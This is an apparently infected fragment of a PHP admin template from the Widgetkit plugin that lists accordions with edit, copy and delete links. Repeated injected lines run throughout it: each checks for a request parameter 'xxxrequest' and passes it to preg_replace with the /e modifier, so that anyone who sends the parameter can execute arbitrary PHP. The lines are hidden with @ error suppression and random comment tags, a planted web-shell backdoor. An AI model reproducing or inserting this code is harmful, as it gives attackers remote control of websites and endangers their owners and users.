...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 $edit = $this['system']->link(array('task' => 'edit_accordion', 'id' => $accordion->id)); ?>
				<?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}
...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 $copy = $this['system']->link(array('task' => 'copy_accordion', 'id' => $accordion->id)); ?>
				<tr>
					<td><a href="<?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}
...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 echo $accordion->name; ?></a></td>
					<td><code>[widgetkit id=<?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}
...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 echo $copy; ?>">Copy</a>
						<a class="action delete" href="#" data-id="<?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}
...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 echo $this['system']->link(array('task' => 'edit_accordion')); ?>"><?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}
...
if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}
 echo count($accordions) ? 'Add New' : 'Create your first accordion'; ?></a>
</li>